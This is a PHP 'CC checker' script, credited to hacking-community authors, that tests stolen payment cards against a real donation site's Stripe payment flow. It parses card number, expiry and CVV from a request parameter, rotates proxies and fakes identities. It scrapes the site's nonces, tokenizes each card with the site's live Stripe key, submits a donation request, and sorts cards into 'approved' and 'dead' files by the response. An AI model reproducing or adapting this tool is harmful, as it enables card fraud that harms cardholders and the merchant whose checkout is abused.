<?php

////////////////PHCommunityHackers
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function rebootproxys()
{
   $poxyHttps = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxyHttps) - 1);
  $poxyHttps = $poxyHttps[$myproxy];
  return $poxyHttps;
}
$poxyHttps = rebootproxys();
$ip = multiexplode(array(":", "|", ""), $poxyHttps)[0];
//echo '<span class="badge badge-info">★ IP: '.$ip.' ★</span> ★ </span>'

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

# ----------------- [ Nonce and Cookies ] ---------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.jannadarnelle.com/give/'); //ETO LANG PAPALITAN
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');

$headers = array();
$headers[] ='Host: www.jannadarnelle.com'; // ETO LANG PAPALITAN
$headers[] ='Connection: keep-alive';
$headers[] ='Cache-control: max-age=0';
$headers[] ='Upgrade-insecure-requests: 1';
$headers[] ='Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=STRIPE;q=0.9';
$headers[] ='Sec-Fetch-Mode: navigate';
$headers[] ='Sec-Fetch-User: ?1';
$headers[] ='Sec-Fetch-Site: none';
$headers[] ='Accept-Language: en-US,en;q=0.9';
$headers[] ='User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36';

curl_setopt($ch,CURLOPT_HTTPHEADER, $headers);
$result0 = curl_exec($ch);
$nonce = trim(strip_tags(getStr($result0,'name="_wpnonce" value="','"')));
$wp = trim(strip_tags(getStr($result0, 'windows.tdwGlobal = {"','}'), '"wpRestNonce":"','"'));
$formid = trim(strip_tags(getStr($result0,'name="simpay_form_id" value="','"')));;


# ----------------- [ 1st curl  ] ---------------------#

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources'); //ETO LANG PAPALITAN
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.'+'.$last.'&owner[email]='.$name.'%40gmail.com&owner[address][line1]=2250++Jarvis+Street&owner[address][city]=New+York&owner[address][state]=New+York&owner[address][postal_code]=10007&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=533dab6f-a31e-4fdb-b01e-b7ca70b74347aa9490&muid=6d595e72-99f2-4055-8818-76177633b745bc5ca3&sid=cf8a252b-f7ad-4a1d-8ce0-1728d7ed08a3517fef&pasted_fields=number&payment_user_agent=stripe.js%2F9102ba9c%3B+stripe-js-v3%2F9102ba9c&time_on_page=57951&referrer=https%3A%2F%2Fwww.jannadarnelle.com%2F&key=pk_live_30bhyY6dFDRK26y6Z2E8029C00IeUVhwZl'); //ETO LANG PAPALITAN

$headers = array();
$headers[] ='Host: api.stripe.com';
//$headers[] ='x-requested-with: ';
//$headers[] ='x-wp-nonce: ';
$headers[] ='accept: application/json';
$headers[] ='Content-Type: application/x-www-form-urlencoded';
$headers[] ='Origin: https://js.stripe.com'; //ETO LANG PAPALITAN
$headers[] ='Referer: https://js.stripe.com/'; //ETO LANG PAPALITAN
$headers[] ='Sec-Fetch-Mode: cors';
$headers[] ='User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36';

curl_setopt($ch,CURLOPT_HTTPHEADER, $headers);

$result1 = curl_exec($ch); //printing the result
$gorilla = json_decode($result1, true);
$token1 = $gorilla['id'];

// echo $result1;

# ----------------- [ 2nd curl ] ---------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.jannadarnelle.com/wp-json/wpsp/v2/customer'); //ETO LANG PAPALITAN
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_values%5Bsimpay_multi_plan_3732%5D=plan_F2NBbMNVLuKvh7&form_values%5Bsimpay_subscription_custom_amount%5D=25.00&form_values%5Bsimpay_customer_name%5D='.$name.'+'.$last.'&form_values%5Bsimpay_email%5D='.$name.'%40gmail.com&form_values%5Bsimpay_billing_address_line1%5D=2250++Jarvis+Street&form_values%5Bsimpay_billing_address_city%5D=New+York&form_values%5Bsimpay_billing_address_state%5D=New+York&form_values%5Bsimpay_billing_address_postal_code%5D=10007&form_values%5Bsimpay_billing_address_country%5D=US&form_values%5Bsimpay_form_id%5D='.$formid.'&form_values%5Bsimpay_amount%5D=2500&form_values%5Bsimpay_multi_plan_id%5D=plan_F2NBbMNVLuKvh7&form_values%5Bsimpay_multi_plan_setup_fee%5D=0&form_values%5Bsimpay_max_charges%5D=0&form_values%5B_wpnonce%5D='.$nonce.'&form_values%5B_wp_http_referer%5D=%2Fgive%2F&form_data%5BformId%5D='.$formid.'&form_data%5BformInstance%5D=0&form_data%5Bquantity%5D=1&form_data%5BisValid%5D=true&form_data%5BstripeParams%5D%5Bkey%5D=pk_live_30bhyY6dFDRK26y6Z2E8029C00IeUVhwZl&form_data%5BstripeParams%5D%5Bsuccess_url%5D=https%3A%2F%2Fwww.jannadarnelle.com%2Fpayment-confirmation%2F%3Fform_id%3D'.$formid.'&form_data%5BstripeParams%5D%5Berror_url%5D=https%3A%2F%2Fwww.jannadarnelle.com%2Fpayment-failed%2F%3Fform_id%3D'.$formid.'&form_data%5BstripeParams%5D%5Bname%5D=Janna+Darnelle&form_data%5BstripeParams%5D%5Blocale%5D=auto&form_data%5BstripeParams%5D%5Bcountry%5D=US&form_data%5BstripeParams%5D%5Bcurrency%5D=USD&form_data%5BstripeParams%5D%5Bdescription%5D=Recurring+Monthly+Donation&form_data%5BstripeParams%5D%5BelementsLocale%5D=auto&form_data%5BstripeParams%5D%5Bamount%5D=2500&form_data%5BisSubscription%5D=true&form_data%5BisTrial%5D=false&form_data%5BhasCustomerFields%5D=true&form_data%5BhasPaymentRequestButton%5D=false&form_data%5Bamount%5D=0&form_data%5BsetupFee%5D=0&form_data%5BminAmount%5D=1&form_data%5BtotalAmount%5D=&form_data%5BsubMinAmount%5D=1&form_data%5BplanIntervalCount%5D=1&form_data%5BtaxPercent%5D=0&form_data%5BfeePercent%5D=0&form_data%5BfeeAmount%5D=0&form_data%5BminCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B1.00&form_data%5BsubMinCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B1.00&form_data%5BpaymentButtonText%5D=Pay+with+Card&form_data%5BpaymentButtonLoadingText%5D=Please+Wait...&form_data%5BsubscriptionType%5D=user&form_data%5BplanInterval%5D=month&form_data%5BcheckoutButtonText%5D=Pay+%7B%7Bamount%7D%7D&form_data%5BcheckoutButtonLoadingText%5D=Please+Wait...&form_data%5BdateFormat%5D=mm%2Fdd%2Fyy&form_data%5BformDisplayType%5D=embedded&form_data%5BcustomAmount%5D=25&form_data%5BplanAmount%5D=25&form_data%5BcustomPlanAmount%5D=25&form_data%5BfinalAmount%5D=25.00&form_data%5BcouponCode%5D=&form_data%5Bdiscount%5D=0&form_id='.$formid.'&source_id='.$token1.''); //ETO LANG PAPALITAN'); //ETO LANG PAPALITAN

$headers = array();
$headers[] ='Host: www.jannadarnelle.com'; // eto lang papalitan
$headers[] ='x-requested-with: XMLHttpRequest';
$headers[] ='x-wp-nonce: '.$wp.'';  
$headers[] ='accept: application/json';
$headers[] ='Content-Type: application/x-www-form-urlencoded';
$headers[] ='Origin: https://www.jannadarnelle.com'; //ETO LANG PAPALITAN
$headers[] ='Referer: https://www.jannadarnelle.com/give/'; //ETO LANG PAPALITAN
$headers[] ='Sec-Fetch-Mode: cors';
$headers[] ='User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36';

curl_setopt($ch,CURLOPT_HTTPHEADER, $headers);

 $result2 = curl_exec($ch);
$unggoy = json_decode($result2, true);
$token2 = $unggoy['id'];



#----------------- [ 3rd Curl ] ---------------------#

// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, 'https://www.jannadarnelle.com/wp-json/wpsp/v2/subscription'); //ETO LANG PAPALITAN
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt($ch, CURLOPT_HEADER, 0);
// curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_values%5Bsimpay_multi_plan_'.$formid.'%5D=plan_F2NhOq8LMTazqO&form_values%5Bsimpay_subscription_custom_amount%5D=1.00&form_values%5Bsimpay_customer_name%5D=Zync+Boi&form_values%5Bsimpay_email%5D=zyncboi%40gmail.com&form_values%5Bsimpay_billing_address_line1%5D=2317+Wayside+Lane&form_values%5Bsimpay_billing_address_city%5D=New+York&form_values%5Bsimpay_billing_address_state%5D=NY&form_values%5Bsimpay_billing_address_postal_code%5D=10080&form_values%5Bsimpay_billing_address_country%5D=US&form_values%5Bsimpay_form_id%5D='.$formid.'&form_values%5Bsimpay_amount%5D=100&form_values%5Bsimpay_multi_plan_id%5D=plan_F2NhOq8LMTazqO&form_values%5Bsimpay_multi_plan_setup_fee%5D=0&form_values%5Bsimpay_max_charges%5D=0&form_values%5B_wpnonce%5D='.$nonce.'&form_values%5B_wp_http_referer%5D=%2Fgive%2F&form_data%5BformId%5D='.$formid.'&form_data%5BformInstance%5D=0&form_data%5Bquantity%5D=1&form_data%5BisValid%5D=true&form_data%5BstripeParams%5D%5Bkey%5D=pk_live_30bhyY6dFDRK26y6Z2E8029C00IeUVhwZl&form_data%5BstripeParams%5D%5Bsuccess_url%5D=https%3A%2F%2Fwww.jannadarnelle.com%2Fpayment-confirmation%2F%3Fform_id%3D'.$formid.'&form_data%5BstripeParams%5D%5Berror_url%5D=https%3A%2F%2Fwww.jannadarnelle.com%2Fpayment-failed%2F%3Fform_id%3D'.$formid.'&form_data%5BstripeParams%5D%5Bname%5D=Janna+Darnelle&form_data%5BstripeParams%5D%5Blocale%5D=auto&form_data%5BstripeParams%5D%5Bcountry%5D=US&form_data%5BstripeParams%5D%5Bcurrency%5D=USD&form_data%5BstripeParams%5D%5Bdescription%5D=Recurring+Monthly+Donation&form_data%5BstripeParams%5D%5BelementsLocale%5D=auto&form_data%5BstripeParams%5D%5Bamount%5D=100&form_data%5BisSubscription%5D=true&form_data%5BisTrial%5D=false&form_data%5BhasCustomerFields%5D=true&form_data%5BhasPaymentRequestButton%5D=false&form_data%5Bamount%5D=0&form_data%5BsetupFee%5D=0&form_data%5BminAmount%5D=1&form_data%5BtotalAmount%5D=&form_data%5BsubMinAmount%5D=1&form_data%5BplanIntervalCount%5D=1&form_data%5BtaxPercent%5D=0&form_data%5BfeePercent%5D=0&form_data%5BfeeAmount%5D=0&form_data%5BminCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B1.00&form_data%5BsubMinCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B1.00&form_data%5BpaymentButtonText%5D=Pay+with+Card&form_data%5BpaymentButtonLoadingText%5D=Please+Wait...&form_data%5BsubscriptionType%5D=user&form_data%5BplanInterval%5D=month&form_data%5BcheckoutButtonText%5D=Pay+%7B%7Bamount%7D%7D&form_data%5BcheckoutButtonLoadingText%5D=Please+Wait...&form_data%5BdateFormat%5D=mm%2Fdd%2Fyy&form_data%5BformDisplayType%5D=embedded&form_data%5BcustomAmount%5D=50&form_data%5BplanAmount%5D=50&form_data%5BcustomPlanAmount%5D=50&form_data%5BfinalAmount%5D=1.00&form_data%5BcouponCode%5D=&form_data%5Bdiscount%5D=0&form_id='.$formid.'&customer_id='.$token2.''); //ETO LANG PAPALITAN'); //ETO LANG PAPALITAN
// //souce_id= $token
// //formid = $formid

// $headers = array();
// $headers[] ='Host: www.jannadarnelle.com'; // eto lang papalitan
// $headers[] ='x-requested-with: XMLHttpRequest';
// $headers[] ='x-wp-nonce: '.$wp.'';
// $headers[] ='accept: application/json';
// $headers[] ='Content-Type: application/x-www-form-urlencoded';
// $headers[] ='Origin: https://www.jannadarnelle.com'; //ETO LANG PAPALITAN
// $headers[] ='Referer: https://www.jannadarnelle.com/give/'; //ETO LANG PAPALITAN
// $headers[] ='Sec-Fetch-Mode: cors';
// $headers[] ='User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36';

// curl_setopt($ch,CURLOPT_HTTPHEADER, $headers);

//  $result3 = curl_exec($ch);
// $message = trim(strip_tags(getstr($result3,'','"cvc_check":""','')));
//   // echo $result3;

# ----------------- [ Bin lookup ] ---------------------#

///////////////////////// Bin Lookup Api //////////////////////////
// this is for additional info - so result will look more good by adding the info of the bin

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
function getbnk($bin)
{
 sleep(rand(1,6));
$bin = substr($bin,0,6);
$url = 'http://bins.su';
//  Initiate curl
$ch = curl_init();
// Disable SSL verification
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
// Will return the response, if false it print the response
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// Set the url
curl_setopt($ch, CURLOPT_URL,$url);
// Execute
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&BIN=&country=');
$result=curl_exec($ch);
// Closing
curl_close($ch);

// Will dump a beauty json :3
//var_dump(json_decode($result, true));

if (preg_match_all('(<tr><td>'.$bin.'</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>)siU', $result, $matches1))
{
$r1 = $matches1[1][0];
$r2 = $matches1[2][0];
$r3 = $matches1[3][0];
$r4 = $matches1[4][0];
$r5 = $matches1[5][0];
//if(stristr($result,$ip'<tr><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>'))

 return "$r2 - $r1 - $r3 - $r4 - $r5";

}
else
{
 return "$bin|Unknown.";
}
}

// echo $result2;
/////////////////////////// [Card Response]  //////////////////////////
//////// dependig upon response of site you have to add or delete the results

if (strpos($result2, ',"cvc_check":"pass",')) {
  fwrite(fopen('CVV.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-success">#Approved</span> </span> <span class="badge badge-warning">'.$lista.'</span> <span class="badge badge-success"> ᴄᴠᴄ_ᴄʜᴇᴄᴋ ᴘᴀss | Peso Daan </span> </span> ';
}
elseif (strpos($result2, "Your card's security code is incorrect.")) {
  fwrite(fopen('CCN.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">#Approve</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-warning">sᴇᴄᴜʀɪᴛʏ ᴄᴏᴅᴇ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ | Peso Daan </span>';
}
elseif(strpos($result2, 'Your card has insufficient funds.')) {
  fwrite(fopen('insufficient.txt', 'a'), $lista."\r\n");
   echo '<span class="badge badge-success">#Approved</span> </span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-success"> ɪɴsᴜғғɪᴄɪᴇɴᴛ ғᴜɴᴅs | Peso Daan </span> </span> ';
}
elseif(strpos($result2, 'Your card has expired.')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-danger">ᴄᴀʀᴅ ᴅᴇᴄʟɪɴᴇᴅ [D-code] Card Expired | Peso Daan</span> </br>';
}
elseif(strpos($result2, 'Your card number is incorrect.')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-danger">ᴄᴀʀᴅ ᴅᴇᴄʟɪɴᴇᴅ [D-code] incorrect card number | Peso Daan</span> </br>';
}

elseif(strpos($result2, 'Your card was declined.')) {
  fwrite(fopen('dead.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-danger">ᴄᴀʀᴅ ᴅᴇᴄʟɪɴᴇᴅ [D-code] Card Declined | Peso Daan</span> </br>';
}
elseif (strpos($result1, "generic_decline")) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger"></span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-dark">[D-code] generic_decline | Peso Daan</span> </br>';
}
elseif (strpos($result1, "card declined")) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger"></span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-dark">[D-code] generic_decline | Peso Daan</span> </br>';
}
elseif (strpos($result2, "do_not_honor")) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-danger">ᴄᴀʀᴅ ᴅᴇᴄʟɪɴᴇᴅ [D-code] Do not honor | Peso Daan</span> </br>';
}
elseif (strpos($result2, '"cvc_check":"unchecked"')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-danger">ᴄᴀʀᴅ ᴅᴇᴄʟɪɴᴇᴅ [D-code] unchecked | Peso Daan</span> </br>';
}
elseif (strpos($result2, "expired_card")) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger"></span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-dark">ᴄᴀʀᴅ ᴅᴇᴄʟɪɴᴇᴅ [D-code] Card expired | Peso Daan</span> </br>';
}
elseif (strpos($result2,'Your card does not support this type of purchase.')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-danger">ᴄᴀʀᴅ ᴅᴇᴄʟɪɴᴇᴅ [D-code] Purchase not supported | Peso Daan</span> </br>';
}
 else {
  fwrite(fopen('dead.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-danger">ᴄᴀʀᴅ ᴅᴇᴄʟɪɴᴇᴅ [D-code] ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ | Peso Daan</span> </br>';
}
  curl_close($curl);
  ob_flush();

 // echo $result2; //////=========Comment echo $result If U Want To Hide Site Side Response
/////////////////////=====Edited By @MrNiceguy25                  =======================Credits to Chillz====================\\\\\\\\\\\\\\\

?>
